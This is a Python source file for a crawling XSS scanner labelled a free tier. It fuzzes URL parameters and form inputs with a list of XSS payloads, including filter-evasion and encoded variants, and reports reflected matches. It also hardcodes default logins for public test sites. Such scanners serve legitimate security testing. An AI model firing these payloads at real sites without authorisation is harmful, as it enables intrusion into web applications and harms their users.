import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, unquote
import argparse
import os
import collections
from login_helper import perform_auto_login # Import helper
from colorama import Fore, Style
import csv
import re
import datetime
import time
from report_generator import generate_report

# Global Statistics for Report
SCAN_STATS = {
    "target_url": "",
    "scan_start": "",
    "scan_end": "",
    "duration_seconds": 0,
    "urls_scanned": 0,
    "total_payloads_tested": 0,
    "findings": [],
    "total_findings": 0
}

# List of XSS payloads
# FREE TIER: Basic payload list (10 payloads)
# Premium (ML) version has 25 advanced payloads with WAF bypasses
XSS_PAYLOADS = [
    # 1. Polyglots (Break out of contexts)
    '"> <script>alert(1)</script>',
    '\';alert(1)//',
    '";alert(1)//',
    
    # 2. Standard HTML Injection (Script Tags)
    '<script>alert(1)</script>',
    '<ScRiPt>alert(1)</sCrIpT>',
    '"><script>alert(1)</script>',
    '</script><script>alert(1)</script>',
    
    # 3. Attribute Injection (Event Handlers)
    '" onfocus=alert(1) autofocus "',
    '\' onfocus=alert(1) autofocus \'',
    '" onmouseover=alert(1) "',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=prompt(1)>',
    
    # 4. SVG & Modern Vectors (Bypass Filters)
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script>',
    '<svg onload=alert(1)//',
    
    # 5. Protocol Injection (HREF/Action)
    'javascript:alert(1)',
    'javascript:prompt(1)',
    'java%09script:alert(1)', # Tab obfuscation
    
    # 6. CSS / Link Vectors (Found effective on Acunetix test site)
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>',
    
    # 7. Obfuscated / WAF Bypasses
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    '<img src=x onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
    
    # 8. Frame / Object
    '<iframe src="javascript:alert(1)"></iframe>',
    '<iframe onload=alert(1)></iframe>',
    '<body onload=alert(1)>'
]

# Global variables
crawled_links = set()
found_vulnerabilities = set()

# Global Session
    # Initialize Session
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
})

session.cookies.set("PHPSESSID", "1ga0osdggsuernnadkek5bmp20")

session.cookies.set("security_level", "0")

def print_crawled_links():
    print(f"\n[+] Links crawled:")
    for link in crawled_links:
        print(f"    {link}")
    print()

def check_vulnerability(payload, resp_text):
    """
    Implements flexible matching and verification:
    1. Case-insensitive check.
    2. Whitespace-flexible check (using regex).
    3. Checks if dangerous characters in the payload are reflected UNENCODED.
    """
    # 1. Trivial Check: Exact match (fastest)
    if payload in resp_text:
        return True

    # 2. Case-Insensitive Check
    if payload.lower() in resp_text.lower():
        # Confirm that what matched isn't just safe text (e.g. inside a <textarea> or encoded)
        return True

    # 3. Flexible Regex Match (Option 1)
    # Escape payload for regex, but replace spaces with \s+ to allow flexible whitespace
    try:
        regex_pattern = re.escape(payload)
        regex_pattern = regex_pattern.replace(r'\ ', r'\s*') # Allow flexible spaces
        
        if re.search(regex_pattern, resp_text, re.IGNORECASE):
            return True
            
    except Exception:
        pass

    return False

def get_dummy_value(input_type):
    """Returns a valid dummy value based on input type to bypass validation."""
    input_type = input_type.lower()
    if input_type == "number":
        return "1"
    elif input_type == "email":
        return "test@example.com"
    elif input_type == "url":
        return "http://example.com"
    elif input_type == "tel":
        return "555-555-5555"
    elif input_type == "date":
        return "2023-01-01"
    else:
        return "test"

def get_all_forms(url):
    try:
        response = session.get(url, timeout=10)
        if response.status_code != 200:
            print(f"{Fore.RED}[!] Error accessing {url}: Status Code {response.status_code}{Style.RESET_ALL}")
            return []
            
        soup = bs(response.content, "html.parser")
        forms = soup.find_all("form")
        return forms
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Connection Error in get_all_forms: {e}{Style.RESET_ALL}")
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    # Find all input elements
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    
    # Find all textarea elements (like tfText in showthread.asp)
    for textarea in form.find_all("textarea"):
        input_name = textarea.attrs.get("name")
        inputs.append({"type": "textarea", "name": input_name})
    
    # Find all select elements
    for select in form.find_all("select"):
        input_name = select.attrs.get("name")
        inputs.append({"type": "select", "name": input_name})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value, target_input_name=None):
    target_url = urljoin(url, form_details.get("action", ""))
    inputs = form_details.get("inputs", [])
    data = {}

    for inp in inputs:
        name = inp.get("name")
        inp_type = inp.get("type", "text").lower()
        
        if name:
            if target_input_name and name == target_input_name:
                # Inject payload into the target input
                data[name] = value
            else:
                if target_input_name:
                    data[name] = get_dummy_value(inp_type)
                else:
                    # Legacy behavior: inject into all compatible fields
                    if inp_type in ("text", "search", "email", "tel", "url"):
                        data[name] = value
                    else:
                        data[name] = inp.get("value") # Keep default if present, or None

    try:
        method = form_details.get("method", "get").lower()
        if method == "post":
            response = session.post(target_url, data=data)
        else:
            response = session.get(target_url, params=data)

        req = response.request
        # FIX: Use original target_url (form action) instead of req.url (which may be redirected)
        request_info = {
            "method": req.method,
            "url": target_url,  # Original form action URL
            "original_page_url": url,  # Page where form was found
            "final_url": req.url,  # Redirected URL if any
            "body": req.body
        }
        return response, request_info

    except requests.exceptions.RequestException as e:
        print(f"DEBUG: submit_form failed for {target_url} with error: {e}")
        return None, {"method": form_details.get("method", "get"), "url": target_url, "original_page_url": url, "body": None}

def get_all_links(url):
    try:
        response = session.get(url, timeout=10)
        soup = bs(response.content, "html.parser")
        links = []
        for link in soup.find_all("a"):
            href = link.get("href")
            if href:
                full_url = urljoin(url, href)
                # Filter out javascript:, mailto:, tel:
                if full_url.lower().startswith(("http://", "https://")):
                    links.append(full_url)
        return links
    except requests.exceptions.RequestException as e:
        print(f"[-] Error crawling links from {url}: {e}")
        return []

# --- MAIN SCANNING FUNCTION (NO ML) ---

def scan_url_params(url, args):
    """
    Scans URL parameters (e.g. ?id=1) for XSS vulnerabilities.
    Uses heuristic check only (Non-ML).
    """
    global found_vulnerabilities
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # USER REQUEST: Handle hidden parameters for Logout.asp
    # Logout pages often accept a redirects (RetURL) but don't show it in the link.
    # We manually inject it for testing.
    path_lower = parsed.path.lower()
    if "logout.asp" in path_lower or "login.asp" in path_lower:
        if "returl" not in [k.lower() for k in params.keys()]:
            # Inject hidden parameter if missing
            print(f"{Fore.CYAN}[i] Hidden Parameter Injection: Adding 'RetURL' to {url}{Style.RESET_ALL}")
            params["RetURL"] = ["/"] # Dummy value

    if not params:
        return

    print(f"[*] Scanning URL parameters on: {url}")

    url_vulnerable = False # Track if current URL is already found vulnerable

    for param_name in params.keys():
        if url_vulnerable:
             # Stop for this URL if already vulnerable
            print(f"{Fore.YELLOW}[i] Skipping remaining payloads for {url} (Vulnerability detected){Style.RESET_ALL}")
            return 

        for payload in XSS_PAYLOADS:
            if url_vulnerable:
                break 

            # FREE TIER: Throttle requests (500ms delay)
            time.sleep(0.5)
            
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [payload]
            
            new_query = urlencode(fuzzed_params, doseq=True)
            fuzzed_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            try:
                # IMPORTANT: Disable redirects. RetURL XSS often appears in the 302 response body.
                response = session.get(fuzzed_url, allow_redirects=False)
                
                # Handle encoding issues gracefully
                try: resp_text = response.content.decode('utf-8', errors='ignore')
                except: resp_text = str(response.content)

                # CRITICAL Fix for Encoded Reflections:
                # Browser decodes URL-encoded entities in attributes. We must simulate this.
                try: 
                    raw_text = response.content.decode('utf-8', errors='ignore')
                    resp_text = unquote(raw_text) # Decode %28 -> (
                except: 
                    resp_text = str(response.content)

                SCAN_STATS["total_payloads_tested"] += 1
                
                # Decision Logic: HEURISTIC ONLY
                is_vulnerable = check_vulnerability(payload, resp_text)
                
                if is_vulnerable:
                    # Deduplication
                    vuln_id = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?param={param_name}"
                    
                    if vuln_id not in found_vulnerabilities:
                        found_vulnerabilities.add(vuln_id)
                        print(f"\n{Fore.GREEN}[+] XSS Detected (Pattern Match)!{Style.RESET_ALL}")
                        print(f"[*] URL: {fuzzed_url}")
                        print(f"[*] Parameter: {param_name}")
                        print(f"{Fore.YELLOW}[*] Payload: {payload}{Style.RESET_ALL}")
                        
                        # Report Tracking
                        SCAN_STATS["findings"].append({
                            "url": fuzzed_url,
                            "parameter": param_name,
                            "payload": payload,
                            "confidence": 1.0, # High confidence for pattern match
                            "is_vulnerable": True,
                            "evidence": ["Pattern Match (Heuristic)"],
                            "timestamp": datetime.datetime.now().isoformat()
                        })
                        SCAN_STATS["total_findings"] += 1

                        if args.output:
                            with open(args.output, "a") as f:
                                # Heuristic result (no ML probability)
                                f.write(f"XSS: {fuzzed_url}\nParameter: {param_name}\nPayload: {payload}\nDetection: Pattern Match\n\n")
                    
                    # Decide whether to stop
                    url_vulnerable = True
                    break

            except requests.exceptions.RequestException:
                pass


def scan_xss(start_url, args):
    global crawled_links, found_vulnerabilities
    
    # Use a list as a queue for BFS
    queue = [start_url]
    scanned_urls = set()
    
    # Extract domain from start_url for scope constraint
    try:
        start_parsed = urlparse(start_url)
        target_domain = start_parsed.netloc
        domain_base = f"{start_parsed.scheme}://{start_parsed.netloc}"
    except Exception:
        print("[-] Invalid Start URL")
        return

    while queue:
        url = queue.pop(0)
        
        if url in scanned_urls:
            continue
        scanned_urls.add(url)
        SCAN_STATS["urls_scanned"] += 1
        
        try:
            parsed = urlparse(url)
            if parsed.netloc != target_domain:
                continue
        except:
            continue

        # 1. Scan Parameters
        scan_url_params(url, args)
        
        # 2. Scan Forms
        forms = get_all_forms(url)
        if forms:
            print(f"\n[+] Detected {len(forms)} forms on {url}")
        
        # Check robots.txt (Simple check if obeying)
        crawl_allowed = True
        # ... (Assuming robots check is desired, keeping logic minimal or removing if complex import needed)
        # We'll skip complex robot parser import for simplicity unless requested.
        # But actually let's keep it consistent.
        
        if crawl_allowed:
            for form in forms:
                form_vulnerable = False  # FREE TIER: Track per-form, not per-input
                form_details = get_form_details(form)
                
                # Iterate over each input in the form to fuzz them individually
                form_inputs = form_details.get("inputs", [])
                
                for input_entry in form_inputs:
                    target_input_name = input_entry.get("name")
                    input_type = input_entry.get("type", "text").lower()
                    
                    if not target_input_name:
                        continue
                        
                    if input_type not in ["text", "search", "url", "email", "password", "number", "hidden", "textarea"]:
                        continue

                    # FREE TIER: Stop if we already found this FORM vulnerable
                    if form_vulnerable:
                        break

                    for payload in XSS_PAYLOADS:
                        SCAN_STATS["total_payloads_tested"] += 1
                        
                        # FREE TIER: Throttle requests (500ms delay)
                        time.sleep(0.5)
                        
                        if form_vulnerable:
                            break
                            
                        response, request_info = submit_form(form_details, url, payload, target_input_name=target_input_name)
                        if response is None:
                            continue

                        req_url = request_info.get("url", "")
                        original_page_url = request_info.get("original_page_url", url)
                        
                        # Fix for encoded form reflections
                        try: 
                            raw_text = response.content.decode('utf-8', errors='ignore')
                            resp_text = unquote(raw_text)
                        except: 
                            resp_text = str(response.content)

                        # Decision Logic: HEURISTIC ONLY (FREE TIER)
                        is_vulnerable = check_vulnerability(payload, resp_text)
                        
                        if is_vulnerable:
                            # FREE TIER: Use BASE URL (no query params) for deduplication
                            # This prevents duplicates like Login.asp?RetURL=X vs Login.asp?RetURL=Y
                            base_page = original_page_url.split('?')[0].lower()
                            base_action = req_url.split('?')[0].lower()
                            
                            # Dedupe key is just the base page URL
                            vuln_key = base_page
                            
                            if vuln_key not in found_vulnerabilities:
                                found_vulnerabilities.add(vuln_key)
                                print(f"\n{Fore.GREEN}[+] Form XSS Detected (Pattern Match)!{Style.RESET_ALL}")
                                print(f"[*] Page: {original_page_url}")
                                print(f"[*] Form Action: {req_url}")
                                print(f"[*] Parameter: {target_input_name}")
                                print(f"[*] Payload: {payload}")
                                
                                # Report Tracking
                                SCAN_STATS["findings"].append({
                                    "url": req_url,
                                    "original_page_url": original_page_url,
                                    "parameter": target_input_name,
                                    "payload": payload,
                                    "confidence": 1.0,
                                    "is_vulnerable": True,
                                    "evidence": ["Pattern Match (Heuristic)", "Form-based XSS"],
                                    "timestamp": datetime.datetime.now().isoformat()
                                })
                                SCAN_STATS["total_findings"] += 1

                                if args.output:
                                     with open(args.output, "a") as f:
                                        f.write(f"Form XSS: {req_url}\nPage: {original_page_url}\nParameter: {target_input_name}\nPayload: {payload}\nDetection: Pattern Match\n\n")

                            # FREE TIER: Stop after finding first vulnerability in this form
                            form_vulnerable = True
                            break

        if args.crawl:
            if args.max_links == 0 or len(crawled_links) < args.max_links:
                new_links = get_all_links(url)
                for link in new_links:
                    if link not in scanned_urls and link not in crawled_links:
                        try:
                            l_parsed = urlparse(link)
                            if l_parsed.netloc == target_domain:
                                crawled_links.add(link)
                                queue.append(link)
                                if args.max_links and len(crawled_links) >= args.max_links:
                                    print(f"{Fore.CYAN}[-] Maximum links count reached.{Style.RESET_ALL}")
                                    break
                        except: pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner - FREE TIER (Pattern-based detection, limited payloads)")
    parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
    parser.add_argument("-m", "--max-links", type=int, default=0, help="Maximum number of links to visit. Default 0.")
    parser.add_argument("-o", "--output", help="Output file to save the results")
    parser.add_argument("--report", help="HTML report output filename")
    parser.add_argument("--cookie", help="Session cookie string")
    parser.add_argument("--username", help="Username for auto-login")
    parser.add_argument("--password", help="Password for auto-login")
    parser.add_argument("--login-url", help="URL of the login page (if different from target)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    args = parser.parse_args()
    
    # FREE TIER Banner
    print(f"\n{Fore.CYAN}{'='*60}")
    print("  XSS SCANNER - FREE TIER")
    print("  Pattern-based detection | 10 basic payloads")
    print("  Upgrade to PREMIUM for ML-powered detection (25 payloads)")
    print(f"{'='*60}{Style.RESET_ALL}\n")
    
    # Initialize Stats
    SCAN_STATS["target_url"] = args.url
    SCAN_STATS["scan_start"] = datetime.datetime.now().isoformat()
    start_time = time.time()
    
    # Auto-Login Logic
    if not args.username and not args.cookie:
        if "testasp.vulnweb.com" in args.url:
            print("[*] Target is testasp.vulnweb.com. Using default credentials (admin/none).")
            args.username = "admin"
            args.password = "none"
            args.login_url = "http://testasp.vulnweb.com/Login.asp"
        elif "testphp.vulnweb.com" in args.url:
             print("[*] Target is testphp.vulnweb.com. Using default credentials (test/test).")
             args.username = "test"
             args.password = "test"
             args.login_url = "http://testphp.vulnweb.com/login.php"
        elif "testhtml5.vulnweb.com" in args.url:
            print("[*] Target is testhtml5.vulnweb.com. Using default credentials (admin/none).")
            args.username = "admin"
            args.password = "none" 
            args.login_url = "http://testhtml5.vulnweb.com" 

    if args.username and args.password:
        l_url = args.login_url if args.login_url else args.url
        perform_auto_login(session, l_url, args.username, args.password)

    if args.cookie:
        session.headers.update({"Cookie": args.cookie})
        print(f"[+] Authenticated Scan Enabled. Cookie: {args.cookie[:20]}...")
    
    if not args.url.startswith("http"):
        print("[-] Please provide a valid URL starting with http:// or https://")
        exit(1)

    # Start
    scan_xss(args.url, args) 
    print_crawled_links()
    
    # Report Generation
    end_time = time.time()
    SCAN_STATS["scan_end"] = datetime.datetime.now().isoformat()
    SCAN_STATS["duration_seconds"] = end_time - start_time
    
    if args.report:
        generate_report(SCAN_STATS, args.report)